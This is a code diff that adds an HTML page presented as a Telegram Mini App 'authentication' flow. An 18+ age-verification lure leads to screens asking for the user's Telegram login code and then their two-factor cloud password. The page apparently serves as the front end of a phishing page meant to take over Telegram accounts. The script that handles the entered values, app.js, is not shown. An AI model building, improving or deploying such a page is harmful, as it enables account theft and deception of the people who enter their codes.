@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Mini App - Authentication</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div id="app" class="app-container">
+        <!-- Screen 1: Age Verification -->
+        <div id="ageVerificationScreen" class="screen active">
+            <div class="age-verification-container">
+                <div class="blurred-background"></div>
+                <div class="age-modal">
+                    <h1>Age Verification</h1>
+                    <p>You must be 18 or older to continue</p>
+                    <button id="confirmAgeBtn" class="btn btn-primary">Confirm</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 2: 5-Digit Code Input -->
+        <div id="codeInputScreen" class="screen">
+            <div class="auth-container">
+                <h2>Enter Login Code</h2>
+                <p class="instruction-text">A 5-digit code has been sent to your Telegram account</p>
+                
+                <div class="code-display">
+                    <div class="code-box" id="codeBox1"></div>
+                    <div class="code-box" id="codeBox2"></div>
+                    <div class="code-box" id="codeBox3"></div>
+                    <div class="code-box" id="codeBox4"></div>
+                    <div class="code-box" id="codeBox5"></div>
+                </div>
+
+                <div class="custom-keypad">
+                    <div class="keypad-row">
+                        <button class="keypad-btn" data-key="1">1</button>
+                        <button class="keypad-btn" data-key="2">2</button>
+                        <button class="keypad-btn" data-key="3">3</button>
+                    </div>
+                    <div class="keypad-row">
+                        <button class="keypad-btn" data-key="4">4</button>
+                        <button class="keypad-btn" data-key="5">5</button>
+                        <button class="keypad-btn" data-key="6">6</button>
+                    </div>
+                    <div class="keypad-row">
+                        <button class="keypad-btn" data-key="7">7</button>
+                        <button class="keypad-btn" data-key="8">8</button>
+                        <button class="keypad-btn" data-key="9">9</button>
+                    </div>
+                    <div class="keypad-row">
+                        <button class="keypad-btn" data-key="0">0</button>
+                        <button class="keypad-btn delete-btn" id="deleteBtn">⌫</button>
+                    </div>
+                </div>
+
+                <button id="submitCodeBtn" class="btn btn-secondary" disabled>Submit Code</button>
+                <p class="timer" id="codeTimer"></p>
+            </div>
+        </div>
+
+        <!-- Screen 3: 2FA Password -->
+        <div id="passwordScreen" class="screen">
+            <div class="auth-container">
+                <div class="success-icon">🐵</div>
+                <h2>Two-Factor Authentication</h2>
+                <p class="instruction-text">Your account has Cloud Password enabled</p>
+                <p class="instruction-text secondary">Пожалуйста, введите пароль</p>
+                
+                <div class="input-group">
+                    <input 
+                        type="password" 
+                        id="passwordInput" 
+                        class="password-input" 
+                        placeholder="Enter your cloud password"
+                        maxlength="255"
+                    />
+                </div>
+
+                <button id="verifyPasswordBtn" class="btn btn-primary">Verify</button>
+                <p class="error-message" id="passwordError"></p>
+            </div>
+        </div>
+
+        <!-- Screen 4: Success -->
+        <div id="successScreen" class="screen">
+            <div class="success-container">
+                <div class="success-icon large">🎉</div>
+                <h1>Success!</h1>
+                <p>You have been successfully authenticated</p>
+                <p class="subtext">Welcome to Telegram Mini App</p>
+                <button id="restartBtn" class="btn btn-primary">Start Again</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
